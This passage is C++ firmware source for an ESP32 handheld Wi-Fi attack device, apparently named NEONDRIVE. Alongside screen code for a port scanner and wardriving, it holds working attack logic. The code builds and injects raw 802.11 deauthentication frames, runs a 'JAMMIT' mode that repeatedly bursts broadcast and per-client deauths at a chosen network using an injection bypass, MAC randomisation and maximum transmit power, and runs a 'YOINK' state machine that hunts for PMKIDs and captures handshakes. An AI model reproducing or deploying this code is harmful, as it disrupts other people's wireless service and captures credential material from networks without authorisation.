static void psDrawEventsDynamic() {
  const uint8_t evCount = portScanner.eventCount();
  const uint8_t evShown = 6;
  const int maxEvScroll = max(0, (int)evCount - (int)evShown);
  if (psEventAutoScroll) psEventScroll = maxEvScroll;
  if (psEventScroll > maxEvScroll) psEventScroll = maxEvScroll;
  if (psEventScroll < 0) psEventScroll = 0;
  beginPanelContent(psEventsPanel);
  tft.fillRect(0, 0, psEventsPanel.contentRect.w, psEventsPanel.contentRect.h, TFT_BLACK);
  tft.setTextWrap(false, false);
  for (uint8_t i = 0; i < evShown; ++i) {
    const int evIdx = psEventScroll + i;
    if (evIdx >= evCount) break;
    const ReconEventRecord* ev = portScanner.eventAt((uint8_t)evIdx);
    if (!ev || ev->type == ReconEventType::DISCOVERED) continue;
    IPAddress ip((uint8_t)((ev->ipU32 >> 24) & 0xFF),
                 (uint8_t)((ev->ipU32 >> 16) & 0xFF),
                 (uint8_t)((ev->ipU32 >> 8) & 0xFF),
                 (uint8_t)(ev->ipU32 & 0xFF));
    char line[84];
    if (ev->port > 0) snprintf(line, sizeof(line), "[%s] %s:%u %s", psEventTypeLabel(ev->type), ip.toString().c_str(), (unsigned)ev->port, ev->service ? ev->service : ev->message);
    else snprintf(line, sizeof(line), "[%s] %s", psEventTypeLabel(ev->type), ev->message);
    drawTextClipped(String(line), 4, 2 + i * 8, psEventsPanel.contentRect.w - 12, psEventTypeColor(ev->type), TFT_BLACK, false);
  }
  endPanelContent();
  if (maxEvScroll > 0) {
    const int eTrackY = psEventsRect.y + 14;
    const int eTrackH = psEventsRect.h - 18;
    const int eKnobH = max(10, (eTrackH * evShown) / max(1, (int)evCount));
    const int eKnobY = eTrackY + ((eTrackH - eKnobH) * psEventScroll) / max(1, maxEvScroll);
    tft.fillRect(psEventsRect.x + psEventsRect.w - 6, eTrackY, 4, eTrackH, tft.color565(10, 20, 10));
    tft.fillRect(psEventsRect.x + psEventsRect.w - 6, eKnobY, 4, eKnobH, TFT_GREEN);
  } else {
    tft.fillRect(psEventsRect.x + psEventsRect.w - 6, psEventsRect.y + 14, 4, psEventsRect.h - 18, TFT_BLACK);
  }
}

static void psDrawStatusDynamic() {
  const uint8_t total = portScanner.hostCount();
  const int pct = (int)portScanner.progressPct();
  psDrawProgressRing(psStatusRect.x + psStatusRect.w / 2, psStatusRect.y + 34, 24, pct);
  beginPanelContent(psStatusPanel);
  tft.fillRect(0, 44, psStatusPanel.contentRect.w, max(0, psStatusPanel.contentRect.h - 44), TFT_BLACK);
  tft.setTextDatum(MC_DATUM);
  tft.setTextColor(TFT_GREEN, TFT_BLACK);
  applyFontMd();
  char pctBuf[8]; snprintf(pctBuf, sizeof(pctBuf), "%d%%", pct);
  tft.drawString(pctBuf, psStatusPanel.contentRect.w / 2, 22);
  applyFontSm();
  tft.setTextDatum(TL_DATUM);
  char hostsBuf[32];
  snprintf(hostsBuf, sizeof(hostsBuf), "HOSTS %u/%lu", (unsigned)total, (unsigned long)portScanner.totalHostCandidates());
  drawTextClipped(String(hostsBuf), 4, 56, psStatusPanel.contentRect.w - 8, TFT_GREEN, TFT_BLACK, false);
  char portsBuf[32];
  snprintf(portsBuf, sizeof(portsBuf), "PORTS %lu/%lu", (unsigned long)portScanner.portsAttempted(), (unsigned long)portScanner.portsTotal());
  drawTextClipped(String(portsBuf), 4, 68, psStatusPanel.contentRect.w - 8, TFT_GREEN, TFT_BLACK, false);
  endPanelContent();
}

static void psDrawRateDynamic() {
  beginPanelContent(psRatePanel);
  tft.fillRect(0, 0, psRatePanel.contentRect.w, psRatePanel.contentRect.h, TFT_BLACK);
  char rateBuf[20];
  snprintf(rateBuf, sizeof(rateBuf), "%u /s", (unsigned)portScanner.latestRatePerSec());
  drawTextClipped(String(rateBuf), max(2, (int)(psRatePanel.contentRect.w - tft.textWidth(rateBuf) - 2)), 0, psRatePanel.contentRect.w - 2, TFT_CYAN, TFT_BLACK, false);
  endPanelContent();
  psDrawTinySparkline(psRateRect);
}

static void psDrawButtonsDynamic() {
  const int w = tft.width();
  const int h = tft.height();
  const int bottomY = 266;
  const int gap = 6;
  const int bw  = (w - 10 - (gap * 4)) / 5;
  const int bx0 = 5;
  const int by  = bottomY + 2;
  const int bh  = h - by - 3;
  btnPSBack   = {bx0 + 0 * (bw + 2), by, bw, bh, "Back"};
  btnPSStart  = {bx0 + 1 * (bw + 2), by, bw, bh, psActive ? "Stop" : "Scan"};
  btnPSMode   = {bx0 + 2 * (bw + 2) + 6, by, bw - 6, bh, psDeepScanEnabled ? "Mode:Deep" : "Mode:Fast"};
  btnPSExport = {bx0 + 3 * (bw + 2), by, bw, bh, "Save"};
  btnPSClr    = {bx0 + 4 * (bw + 2), by, bw, bh, "Clear"};
  const uint16_t bcs[5] = {TFT_CYAN,TFT_GREEN,TFT_MAGENTA,TFT_YELLOW,TFT_RED};
  Button* allBtns[5] = {&btnPSBack,&btnPSStart,&btnPSMode,&btnPSExport,&btnPSClr};
  for (int i = 0; i < 5; ++i) drawButton(*allBtns[i], TFT_BLACK, bcs[i], TFT_WHITE);
}

static void psDrawDynamicRegions(uint16_t mask) {
  if (mask & PS_DIRTY_HEADER) psDrawHeaderDynamic();
  if (mask & PS_DIRTY_HOSTS) psDrawHostsDynamic();
  if (mask & PS_DIRTY_TARGET) psDrawTargetDynamic();
  if (mask & PS_DIRTY_EVENTS) psDrawEventsDynamic();
  if (mask & PS_DIRTY_STATUS) psDrawStatusDynamic();
  if (mask & PS_DIRTY_RATE) psDrawRateDynamic();
  if (mask & PS_DIRTY_BUTTONS) psDrawButtonsDynamic();
}

static void flushInvalidRects() {
  if (psDirtyCount == 0) return;
  uint16_t mask = 0;
  for (uint8_t i = 0; i < psDirtyCount; ++i) {
    const UiRect& r = psDirtyRects[i];
    if (uiRectsIntersect(r, psHeaderRect)) mask |= PS_DIRTY_HEADER;
    if (uiRectsIntersect(r, psHostsPanel.frameRect)) mask |= PS_DIRTY_HOSTS;
    if (uiRectsIntersect(r, psTargetPanel.frameRect)) mask |= PS_DIRTY_TARGET;
    if (uiRectsIntersect(r, psEventsPanel.frameRect)) mask |= PS_DIRTY_EVENTS;
    if (uiRectsIntersect(r, psStatusPanel.frameRect)) mask |= PS_DIRTY_STATUS;
    if (uiRectsIntersect(r, psRatePanel.frameRect)) mask |= PS_DIRTY_RATE;
    if (uiRectsIntersect(r, psButtonsRect)) mask |= PS_DIRTY_BUTTONS;
  }
  psDirtyCount = 0;
  if (mask) psDrawDynamicRegions(mask);
}

static void drawPortScanner() {
  const ReconScanState st = portScanner.state();
  psComputeLayout();
  if (psNeedsFullStatic || !psLayoutDrawn) {
    tft.fillScreen(TFT_BLACK);
    drawUniversalBackground();
    psDrawHeaderStatic();
    psDrawLayoutStatic();
    psNeedsFullStatic = false;
  }
  psDrawDynamicRegions(PS_DIRTY_ALL_DYNAMIC);
  const uint8_t total = portScanner.hostCount();
  const int pct = (int)portScanner.progressPct();
  const uint8_t phaseU8 =
      (st == ReconScanState::ERROR) ? 3 :
      (st == ReconScanState::DONE)  ? 2 :
      (portScanner.isRunning() ? 1 : 0);
  psLayoutDrawn=true;
  psLastHostCount=total;
  psLastPct=(uint8_t)pct;
  psLastState=phaseU8;
  psLastRatePerSec = portScanner.latestRatePerSec();
  psLastPortsAttempted = portScanner.portsAttempted();
  psLastEventCount = portScanner.eventCount();
}

static void portScannerTick() {
  if (screen != ScreenId::PORT_SCANNER) return;
  portScanner.tick();
  const uint8_t total   = portScanner.hostCount();
  const ReconScanState st = portScanner.state();
  const uint8_t phaseU8 =
      (st == ReconScanState::ERROR) ? 3 :
      (st == ReconScanState::DONE)  ? 2 :
      (portScanner.isRunning() ? 1 : 0);
  if (!portScanner.isRunning() && psActive) psActive = false;
  const int maxScroll = max(0, (int)total - PS_HOST_ROWS_VISIBLE);
  bool needFullDraw = !psLayoutDrawn || psNeedsFullStatic;
  bool haveDirty = false;
  if (total != psLastHostCount) {
    psInvalidatePanel(psHostsPanel);
    psInvalidatePanel(psStatusPanel);
    haveDirty = true;
  }
  const uint8_t pctNow = portScanner.progressPct();
  if (pctNow != psLastPct || phaseU8 != psLastState) {
    psInvalidatePanel(psStatusPanel);
    haveDirty = true;
  }
  const uint32_t portsAttemptedNow = portScanner.portsAttempted();
  if (portsAttemptedNow != psLastPortsAttempted) {
    psInvalidatePanel(psStatusPanel);
    haveDirty = true;
  }
  const uint16_t rateNow = portScanner.latestRatePerSec();
  if (rateNow != psLastRatePerSec) {
    psInvalidatePanel(psRatePanel);
    haveDirty = true;
  }
  const uint8_t evNow = portScanner.eventCount();
  if (evNow != psLastEventCount) {
    psInvalidatePanel(psEventsPanel);
    haveDirty = true;
  }
  if ((int)psScrollOffset > maxScroll) {
    psScrollOffset = (uint8_t)maxScroll;
    psInvalidatePanel(psHostsPanel);
    haveDirty = true;
  }
  if (!portScanner.isRunning() && total>0 && psSelectedRow<0) psSelectedRow=0;
  if (psSelectedRow >= (int16_t)total) psSelectedRow = (total > 0) ? (int16_t)(total - 1) : -1;
  if (psSelectedRow != psLastSelectedRow) {
    psLastSelectedRow=psSelectedRow;
    psInvalidatePanel(psHostsPanel);
    psInvalidatePanel(psTargetPanel);
    haveDirty = true;
  }

  if (psActive != portScanner.isRunning()) {
    invalidateRect(psButtonsRect);
    haveDirty = true;
  }

  if (needFullDraw) {
    drawPortScanner();
  } else if (haveDirty) {
    flushInvalidRects();
  }
  psLastDrawMs=millis();
  psLastState = phaseU8;
  psLastHostCount = total;
  psLastPct = pctNow;
  psLastRatePerSec = rateNow;
  psLastPortsAttempted = portsAttemptedNow;
  psLastEventCount = evNow;
}

// ---------- Wardrive Screen ----------
static void setScreen(ScreenId next);  // forward declaration
#if defined(NEONDRIVE_TARGET_CYD)
static const char* cydRotationLabel(int r);
static void applyCydManualRotation(int rotation, bool redraw);
#endif
static bool wardriveActive = false;

static void drawWardrive() {
  const int w = tft.width();
  const int h = tft.height();
  tft.fillScreen(TFT_BLACK);
  drawHeader("// WARDRIVE");
  drawUniversalBackground();

  const GpsFix& g = GpsService::fix();
  const int pad = 8;
  int y = uiHeaderBandH() + 10;
  const int lineH = 18;

  // GPS status row
  applyFontSm();
  tft.setTextDatum(TL_DATUM);
  if (!GpsService::isRunning()) {
    tft.setTextColor(TFT_RED, TFT_BLACK);
    tft.drawString("GPS: NOT STARTED", pad, y);
  } else if (!g.valid) {
    tft.setTextColor(TFT_YELLOW, TFT_BLACK);
    tft.drawString("GPS: SEARCHING...", pad, y);
    tft.drawString(String("Sats: ") + g.satellites, pad + 170, y);
  } else {
    tft.setTextColor(TFT_GREEN, TFT_BLACK);
    tft.drawString("GPS: LOCKED", pad, y);
    tft.drawString(String("Sats: ") + g.satellites, pad + 170, y);
  }
  y += lineH + 2;

  // Coordinates
  tft.setTextColor(TFT_CYAN, TFT_BLACK);
  if (g.valid) {
    char buf[48];
    snprintf(buf, sizeof(buf), "LAT  %.6f", g.lat);
    tft.drawString(buf, pad, y); y += lineH;
    snprintf(buf, sizeof(buf), "LON  %.6f", g.lon);
    tft.drawString(buf, pad, y); y += lineH;
    snprintf(buf, sizeof(buf), "SPD  %.1f km/h   ALT %.0fm", GpsService::speedKmh(), g.altMeters);
    tft.drawString(buf, pad, y); y += lineH;
  } else {
    tft.drawString("LAT  --", pad, y); y += lineH;
    tft.drawString("LON  --", pad, y); y += lineH;
    tft.drawString("SPD  --   ALT  --", pad, y); y += lineH;
  }
  y += 4;

  // Wardrive status
  tft.setTextColor(wardriveActive ? TFT_GREEN : TFT_DARKGREY, TFT_BLACK);
  tft.drawString(wardriveActive ? "WARDRIVE: ACTIVE" : "WARDRIVE: STOPPED", pad, y);
  y += lineH + 8;

  // Start / Stop button
  int btnW = (w - pad * 2 - 8) / 2;
  int btnH = 36;
  int btnY = h - btnH - 24;
  Button btnToggle = {pad, btnY, btnW, btnH, wardriveActive ? "Stop" : "Start"};
  Button btnBack   = {pad + btnW + 8, btnY, btnW, btnH, "Home"};
  uint16_t toggleColor = wardriveActive ? TFT_RED : TFT_GREEN;
  drawButton(btnToggle, TFT_BLACK, toggleColor, TFT_WHITE);
  drawButton(btnBack,   TFT_BLACK, TFT_CYAN,   TFT_WHITE);

  drawBorder();
}

static void handleWardriveTouch(int tx, int ty) {
  const int w = tft.width();
  const int h = tft.height();
  int btnW = (w - 8 * 2 - 8) / 2;
  int btnH = 36;
  int btnY = h - btnH - 24;
  Button btnToggle = {8, btnY, btnW, btnH, ""};
  Button btnBack   = {8 + btnW + 8, btnY, btnW, btnH, ""};

  if (hit(btnToggle, tx, ty)) {
    wardriveActive = !wardriveActive;
#if defined(CYD35_GPS_RX) && defined(CYD35_GPS_TX)
    if (wardriveActive && !GpsService::isRunning()) {
      GpsService::begin(CYD35_GPS_RX, CYD35_GPS_TX);
    }
#endif
    Serial.printf("[wardrive] %s\n", wardriveActive ? "STARTED" : "STOPPED");
    drawWardrive();
    waitTouchRelease();
    return;
  }
  if (hit(btnBack, tx, ty)) {
    wardriveActive = false;
    setScreen(ScreenId::HOME);
    waitTouchRelease();
    return;
  }
  waitTouchRelease();
}

// ---------- Recon Home Screen ----------
static void drawReconHome() {
  const int w = tft.width();
  const int h = tft.height();
  tft.fillScreen(TFT_BLACK);
  layoutActionDockBox();
  tft.setTextDatum(TL_DATUM); applyFontSm();
  tft.setTextColor(TFT_CYAN, TFT_BLACK);
  tft.drawString("RECON", 8, 8);
  const int bx=20, bww=w-40, bh=38, gap=10, by0=40;
  const int backH=28, backY=h-backH-6;
  btnReconHomeDeauth  = {bx, by0,            bww, bh, "Deauth Hunter"};
  btnReconHomeNetScan = {bx, by0+bh+gap,     bww, bh, "Net Scan"};
  btnReconHomeAnalyze = {bx, by0+2*(bh+gap), bww, bh, "Analyze SD Files"};
  btnReconHomeBack    = {6,  backY,           70,  backH, "Back"};
  const uint16_t cols[3] = {0xF800, 0x07E0, 0xFFE0};
  Button* btns[3] = {&btnReconHomeDeauth, &btnReconHomeNetScan, &btnReconHomeAnalyze};
  for (int i = 0; i < 3; i++) {
    Button& b = *btns[i];
    tft.fillRoundRect(b.x, b.y, b.w, b.h, 6, tft.color565(20,20,40));
    tft.drawRoundRect(b.x, b.y, b.w, b.h, 6, cols[i]);
    tft.setTextDatum(MC_DATUM);
    tft.setTextColor(cols[i], tft.color565(20,20,40));
    tft.drawString(b.label, b.x+b.w/2, b.y+b.h/2);
  }
  tft.setTextDatum(TL_DATUM);
  tft.setTextColor(TFT_DARKGREY, TFT_BLACK);
  tft.drawString("(coming soon)", bx+bww/2-32, btnReconHomeAnalyze.y+bh+2);
  tft.fillRoundRect(btnReconHomeBack.x, btnReconHomeBack.y,
    btnReconHomeBack.w, btnReconHomeBack.h, 5, tft.color565(30,10,10));
  tft.drawRoundRect(btnReconHomeBack.x, btnReconHomeBack.y,
    btnReconHomeBack.w, btnReconHomeBack.h, 5, TFT_RED);
  tft.setTextDatum(MC_DATUM);
  tft.setTextColor(TFT_RED, tft.color565(30,10,10));
  tft.drawString("Back", btnReconHomeBack.x+btnReconHomeBack.w/2,
    btnReconHomeBack.y+btnReconHomeBack.h/2);
}

// Periodic update for Recon screen.
static void reconTick() {
  if (screen != ScreenId::RECON) return;

  if (reconActive) {
    DeauthHunter::update();
  }

  if (reconScanner.isRunning()) {
    reconScanner.tick();
    if (reconScanner.state() == ReconScanState::DONE) {
      reconStatusLine = "Port scan complete";
    } else if (reconScanner.state() == ReconScanState::ERROR) {
      reconStatusLine = reconScanner.errorMessage();
    }
  }

  const uint32_t now = millis();
  if ((now - reconLastUiTickMs) < 250U) return;
  reconLastUiTickMs = now;

  if (reconView == ReconView::DEAUTH && reconActive) {
    uint32_t totalEvents = DeauthHunter::getTotalEvents();
    uint8_t currentCh = DeauthHunter::getCurrentChannel();
    bool newEvents = (totalEvents > reconLastTotalEvents);
    bool channelChanged = (currentCh != reconLastDrawChannel);
    if (newEvents || channelChanged) {
      reconLastTotalEvents = totalEvents;
      reconLastDrawChannel = currentCh;
      const int modeY = tft.height() - UI_BUTTON_H - 2;
      const int panelTop = uiHeaderBandH() + 5;
      const int panelBottom = modeY - 6;
      drawReconDeauthPanel(panelTop, panelBottom);
      return;
    }
  }

  if (reconView == ReconView::PORT_SCAN && reconScanner.isRunning()) {
    drawRecon();
  }
}

// Decode ASCII hex string (e.g. "C0001234") into a raw byte buffer.
// Returns decoded byte count on success, -1 on bad input or overflow.
// Output buffer must be at least maxLen bytes and ideally 4-byte aligned.
static int hexDecodePayload(const char* hex, uint8_t* out, int maxLen) {
  if (!hex || !out || maxLen <= 0) return -1;
  int len = 0;
  while (*hex) {
    if (!*(hex + 1)) return -1;  // odd nibble count → invalid
    char hi = (char)toupper((unsigned char)*hex++);
    char lo = (char)toupper((unsigned char)*hex++);
    auto nibble = [](char c) -> int {
      if (c >= '0' && c <= '9') return c - '0';
      if (c >= 'A' && c <= 'F') return c - 'A' + 10;
      return -1;
    };
    int h = nibble(hi);
    int l = nibble(lo);
    if (h < 0 || l < 0) return -1;  // non-hex char
    if (len >= maxLen)  return -1;  // would overflow
    out[len++] = (uint8_t)((h << 4) | l);
  }
  return len;
}

// Parse MAC address from colon-separated string
static bool macFromString(const char* str, uint8_t* mac) {
  if (!str || !mac) return false;
  int values[6];
  int count = sscanf(str, "%02X:%02X:%02X:%02X:%02X:%02X",
                     &values[0], &values[1], &values[2],
                     &values[3], &values[4], &values[5]);
  if (count != 6) return false;
  for (int i = 0; i < 6; i++) mac[i] = (uint8_t)values[i];
  return true;
}

// Build and transmit a deauthentication frame.  All callers (jammit, auto modes, tests)
// funnel through this helper so we can centralise the "invalid interface" handling that
// shows up when the driver is left in promiscuous mode.  The previous implementation
// duplicated the packet construction twice and blindly tried the AP interface even when
// AT_MODE_NULL/only-promisc was active, which led to the repeated
// "wifi:invalid interface 1" errors seen in the logs.
//
// We now always hand the packet to tryAlternateTx(), which toggles promiscous mode if
// necessary and only attempts the AP interface when WiFi is actually running in AP or
// APSTA mode.  Failure bookkeeping remains the same so the higher‑level logic can
// detect persistent tx problems.
static void sendDeauthFrame(const uint8_t* bssid, const uint8_t* station, uint8_t reason) {
  // Packet buffer must be 4-byte aligned for esp_wifi_80211_tx
  uint8_t deauthPacket[26] __attribute__((aligned(4))) = {
    0xC0, 0x00,  // Frame Control: Deauth
    0x00, 0x00,  // Duration
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Destination (station)
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Source (AP)
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // BSSID (AP)
    0x00, 0x00,  // Sequence
    0x07, 0x00   // Reason code
  };
  
  memcpy(deauthPacket + 4, station, 6);   // Destination
  memcpy(deauthPacket + 10, bssid, 6);    // Source (AP)
  memcpy(deauthPacket + 16, bssid, 6);    // BSSID
  deauthPacket[24] = reason;
  
  int len = sizeof(deauthPacket);
  Serial.printf("[jammit] TX deauth len=%d bytes:", len);
  for (int i = 0; i < len; i++) Serial.printf(" %02X", deauthPacket[i]);
  Serial.println("");

  // Use the helper which will try STA and, if appropriate, AP with promisc toggle.
  esp_err_t txr = tryAlternateTx(deauthPacket, len);

  if (txr != ESP_OK) {
    Serial.printf("[jammit] esp_wifi_80211_tx error=%d\n", (int)txr);
  }
}

// The previous secondary definition was redundant and didn't perform any validity
// checks on the AP interface.  Remove it entirely – the single implementation above
// now covers all callers and routes through tryAlternateTx(), so we don't need two
// copies of the packet logic.

// (duplicate implementation removed; nothing further required)

// Y0INK mode: Full OINK state machine via YoinkEngine
// Replaces the old simple periodic-deauth approach with the NEONDRIVE
// state machine: SCANNING → PMKID_HUNTING → LOCKING → ATTACKING → WAITING
static void yoinkModeTick() {
  if (autoMode != AutoMode::Y0INK) return;

  // Drive the new YOINK engine state machine
  YoinkEngine::update();

  // Sync stats for the HUD display
  yoinkClientCount = YoinkEngine::getClientCount();
  yoinkDeauthCount = YoinkEngine::getDeauthCount();
  yoinkHandshakeCaptureCount = YoinkEngine::getHandshakeCount();
  sniffPacketCount = YoinkEngine::getPacketCount();
}

// ============================================================
// JAMMIT Helpers
// ============================================================

// Log to serial + console ring + SD session log
static void jammitLog(const char* fmt, ...) {
  char buf[128];
  va_list ap;
  va_start(ap, fmt);
  vsnprintf(buf, sizeof(buf), fmt, ap);
  va_end(ap);
  Serial.printf("[JAMMIT] %s\n", buf);
  pushConsoleEventf("INFO", "JAMMIT", "%s", buf);
  if (sdReady && jammitSessionLogPath[0] != '\0') {
    File f = SD.open(jammitSessionLogPath, FILE_APPEND);
    if (f) {
      uint32_t elapsed = millis() - jammitSessionStartMs;
      f.printf("[%lu.%03lu] %s\n", elapsed / 1000, elapsed % 1000, buf);
      f.close();
    }
  }
}

// Write a deauth frame record to the JAMMIT deauth PCAP file
static void jammitWriteDeauthToPcap(const uint8_t* bssid, const uint8_t* station, uint8_t reason) {
  if (!sdReady || jammitDeauthPcapPath[0] == '\0') return;
  uint8_t frame[26] __attribute__((aligned(4))) = {
    0xC0, 0x00,  // Frame Control: Deauth
    0x00, 0x00,  // Duration
    0x00,0x00,0x00,0x00,0x00,0x00,  // DA
    0x00,0x00,0x00,0x00,0x00,0x00,  // SA (AP spoofed)
    0x00,0x00,0x00,0x00,0x00,0x00,  // BSSID
    0x00, 0x00,                     // Seq
    0x00, 0x00                      // Reason
  };
  memcpy(frame + 4,  station, 6);
  memcpy(frame + 10, bssid,   6);
  memcpy(frame + 16, bssid,   6);
  frame[24] = reason;
  writePacketToPcapPath(jammitDeauthPcapPath, frame, sizeof(frame));
}

// Create /captures/<SSID_BSSID>/ directory, session log, and deauth PCAP
static void jammitInitSaveFiles() {
  jammitSessionLogPath[0] = '\0';
  jammitDeauthPcapPath[0] = '\0';
  if (!sdReady) {
    Serial.println("[jammit] SD not ready - session files skipped");
    return;
  }
  // Build sanitized SSID (matches startSniff convention)
  char sanitizedSsid[33] = {0};
  if (target.ssid.length() == 0 || target.ssid == "(hidden)") {
    strcpy(sanitizedSsid, "HIDDEN");
  } else {
    for (int i = 0; i < (int)target.ssid.length() && i < 32; i++) {
      char c = target.ssid[i];
      sanitizedSsid[i] = (isalnum(c) || c == '-' || c == '_') ? c : '_';
    }
  }
  // BSSID with dashes for directory name
  char bssidDash[18] = {0};
  size_t bl = target.bssid.length();
  for (size_t i = 0; i < bl && i < 17; i++) {
    char c = target.bssid[i];
    bssidDash[i] = (c == ':') ? '-' : c;
  }
  // Set global captureDir so handleCapturedPacket and initCaptureFiles()
  // write raw/beacon/handshakes.pcap to the right place.
  if (!SD.exists("/captures")) SD.mkdir("/captures");
  snprintf(captureDir, sizeof(captureDir), "/captures/%s_%s", sanitizedSsid, bssidDash);
  if (!SD.exists(captureDir)) SD.mkdir(captureDir);

  // JAMMIT session log + deauth PCAP go directly in the capture dir
  snprintf(jammitSessionLogPath, sizeof(jammitSessionLogPath),
           "%s/jammit_session.log", captureDir);
  snprintf(jammitDeauthPcapPath, sizeof(jammitDeauthPcapPath),
           "%s/jammit_deauths.pcap", captureDir);

  // Write session log header
  File logFile = SD.open(jammitSessionLogPath, FILE_WRITE);
  if (logFile) {
    logFile.printf("JAMMIT session: target='%s' bssid=%s ch=%d\n",
                   target.ssid.c_str(), target.bssid.c_str(), target.channel);
    logFile.close();
    Serial.printf("[jammit] Session log: %s\n", jammitSessionLogPath);
  }

  // Write PCAP global header for deauth frames
  if (SD.exists(jammitDeauthPcapPath)) SD.remove(jammitDeauthPcapPath);
  PcapGlobalHeader pcapHdr;
  File pcapFile = SD.open(jammitDeauthPcapPath, FILE_WRITE);
  if (pcapFile) {
    pcapFile.write((uint8_t*)&pcapHdr, sizeof(pcapHdr));
    pcapFile.close();
    Serial.printf("[jammit] Deauth PCAP: %s\n", jammitDeauthPcapPath);
  }
}

// Set up WiFi in STA + WSL bypass + promiscuous (mirrors YoinkEngine startWifi)
static void startJammitWifi() {
#if defined(NEONDRIVE_TARGET_M5TAB5) || defined(NEONDRIVE_TARGET_M5CARDPUTER)
  neon_rf_set_last_action("startJammitWifi");
  neon_rf_log_unsupported("startJammitWifi");
  jammitLog("JAMMIT blocked (no local radio on this target)");
  return;
#endif
  esp_wifi_set_promiscuous(false);
  esp_wifi_set_promiscuous_rx_cb(nullptr);
  WiFi.softAPdisconnect(true);
  WiFi.persistent(false);
  WiFi.setSleep(false);
  WiFi.mode(WIFI_STA);
  delay(50);
  WiFi.disconnect();
  delay(50);

  if (WSLBypasser::isActive()) {
    jammitLog("WSL bypass: ACTIVE (magic 31337 confirmed)");
  } else {
    jammitLog("WARNING: WSL bypass NOT detected – injection may fail");
  }
  WSLBypasser::randomizeMAC();
  esp_wifi_set_ps(WIFI_PS_NONE);
  esp_wifi_set_max_tx_power(82);  // ~20.5 dBm max

  esp_wifi_set_channel((uint8_t)target.channel, WIFI_SECOND_CHAN_NONE);

  esp_wifi_set_promiscuous_rx_cb(&promiscuousPacketCallback);
  wifi_promiscuous_filter_t filt;
  filt.filter_mask = WIFI_PROMIS_FILTER_MASK_MGMT | WIFI_PROMIS_FILTER_MASK_DATA;
  esp_wifi_set_promiscuous_filter(&filt);
  esp_wifi_set_promiscuous(true);

  sniffActive = true;
  jammitLog("WiFi ready: STA+promisc+WSL+PS_NONE+TX82 ch=%d", target.channel);
}

// Tear down JAMMIT WiFi and restore STA mode
static void stopJammitWifi() {
#if defined(NEONDRIVE_TARGET_M5TAB5) || defined(NEONDRIVE_TARGET_M5CARDPUTER)
  // startJammitWifi() is a no-op on these targets; nothing to teardown.
  sniffActive = false;
  return;
#endif
  if (wifiOpMutex && xSemaphoreTake(wifiOpMutex, pdMS_TO_TICKS(1000)) == pdTRUE) {
    esp_wifi_set_promiscuous(false);
    esp_wifi_set_promiscuous_rx_cb(nullptr);
    delay(20);
    WiFi.mode(WIFI_STA);
    delay(20);
    xSemaphoreGive(wifiOpMutex);
  } else {
    esp_wifi_set_promiscuous(false);
    esp_wifi_set_promiscuous_rx_cb(nullptr);
    WiFi.mode(WIFI_STA);
  }
  sniffActive = false;
}

// JAMMIT auto-mode tick: WSL burst deauth (broadcast + per-client), session log
static void jammitModeTick() {
  if (autoMode != AutoMode::JAMMIT) return;
  if (!sniffActive || !hasTarget) return;

  uint32_t now = millis();
  if (jammitLastTickMs == 0) {
    jammitLastTickMs = now;
    jammitLastPkts = sniffPacketCount;
    jammitLastScore = 0;
    jammitLastDeauthMs = now;
    jammitDeauthCount = 0;
    return;
  }
  if (now - jammitLastTickMs < 1000) return;

  uint32_t delta = sniffPacketCount - jammitLastPkts;
  jammitLastPkts = sniffPacketCount;
  jammitLastTickMs = now;
  jammitLastScore = (delta > 0xFFFF) ? 0xFFFF : (uint16_t)delta;

  if (!cfg.wifi_enableDeauth) return;
  if (now - jammitLastDeauthMs < 2000) return;
  jammitLastDeauthMs = now;

  uint8_t bssid[6] = {0};
  if (!macFromString(target.bssid.c_str(), bssid)) {
    jammitLog("ERROR: Cannot parse target BSSID '%s'", target.bssid.c_str());
    return;
  }

  // 1. Broadcast deauth burst (evicts all stations simultaneously)
  static const uint8_t broadcast[6] = {0xFF,0xFF,0xFF,0xFF,0xFF,0xFF};
  WSLBypasser::sendDeauthBurst(bssid, broadcast, 3);
  jammitWriteDeauthToPcap(bssid, broadcast, 7);
  jammitDeauthCount++;

  // 2. Targeted deauth bursts for each discovered client
  uint8_t snapshot[JAMMIT_MAX_CLIENTS][6];
  uint8_t clientSnap = 0;
  portENTER_CRITICAL(&jammitClientMux);
  clientSnap = jammitClientCount;
  if (clientSnap > 0) memcpy(snapshot, jammitClientMacs, clientSnap * 6);
  portEXIT_CRITICAL(&jammitClientMux);

  for (uint8_t i = 0; i < clientSnap; i++) {
    WSLBypasser::sendDeauthBurst(bssid, snapshot[i], 3);
    jammitWriteDeauthToPcap(bssid, snapshot[i], 7);
    jammitDeauthCount++;
    delay(10);  // brief gap between client bursts
  }

  // Periodic log line
  jammitLog("burst bssid=%s clients=%d pps=%u total_deauths=%lu",
            target.bssid.c_str(), (int)clientSnap,
            (unsigned)jammitLastScore, (unsigned long)jammitDeauthCount);
}

// ---------- PACKETLAB WiFi Attack Menu ----------
static bool PACKETLABMenuShowStats = false;
static int PACKETLABTargetScroll = 0;
static int PACKETLABTargetListTopY = 100;
static int PACKETLABTargetListItemH = 28;
static int PACKETLABTargetListItemsPerScreen = 4;
static int PACKETLABTargetListX = 10;
static int PACKETLABTargetListW = 300;

// Draw the PACKETLAB Set Target selection screen
void drawPACKETLABSetTarget() {
  tft.fillScreen(TFT_BLACK);
  drawHeader("SELECT ATTACK TARGET");

  drawUniversalBackground();
  const int h = tft.height();
  const bool compact = (h <= 180);
  const UiRect content = computeContentRect();
  const UiRect bottom = computeBottomBarRect();

  static const char* rowLabels[8] = {"AP1", "AP2", "AP3", "AP4", "AP5", "AP6", "AP7", "AP8"};
  for (int i = 0; i < 8; i++) {
    btnPACKETLABSetTargetRows[i] = {0, 0, 0, 0, rowLabels[i]};
  }
  btnPACKETLABSetTargetAll = {0, 0, 0, 0, "ALL"};
  btnPACKETLABSetTargetUp = {0, 0, 0, 0, "^"};
  btnPACKETLABSetTargetDown = {0, 0, 0, 0, "v"};

  const int controlGap = compact ? 3 : 6;
  int controlW = compact ? 24 : 30;

  PACKETLABTargetListX = content.x;
  int listPanelRight = uiRightLimitForBand(content.y, 16);
  if (listPanelRight < (content.x + 100)) listPanelRight = content.x + content.w;
  int listPanelW = listPanelRight - PACKETLABTargetListX;
  if (listPanelW < 100) listPanelW = 100;
  if (listPanelW < (controlW + 40)) controlW = 0;

  PACKETLABTargetListW = listPanelW - (controlW > 0 ? (controlW + controlGap) : 0);
  if (PACKETLABTargetListW < 80) PACKETLABTargetListW = 80;

  const int metaY = content.y + 1;
